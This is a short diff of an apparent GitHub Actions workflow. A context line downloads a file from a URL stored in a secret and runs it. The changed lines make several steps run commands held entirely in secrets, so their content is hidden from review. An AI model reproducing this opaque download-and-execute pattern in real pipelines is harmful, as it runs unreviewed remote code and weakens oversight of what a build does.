@@ -15,14 +15,14 @@ jobs:
         Invoke-WebRequest ${{ secrets.EA_B }}
         .\${{ secrets.EA_C }}
     - name: command 2
-      run: .\${{ secrets.EA_D }}
+      run: ${{ secrets.EA_D }}
     - name: command 3
-      run: .\${{ secrets.EA_E }}
+      run: ${{ secrets.EA_E }}
     - name: command 4
-      run: .\${{ secrets.EA_F }}
+      run: ${{ secrets.EA_F }}
     - name: command 5
-      run: .\${{ secrets.EA_G }}
+      run: ${{ secrets.EA_G }}
     - name: command 6
-      run: .\${{ secrets.EA_H }}
+      run: ${{ secrets.EA_H }}
     - name: command 7
-      run: .\${{ secrets.EA_I }}
+      run: ${{ secrets.EA_I }}
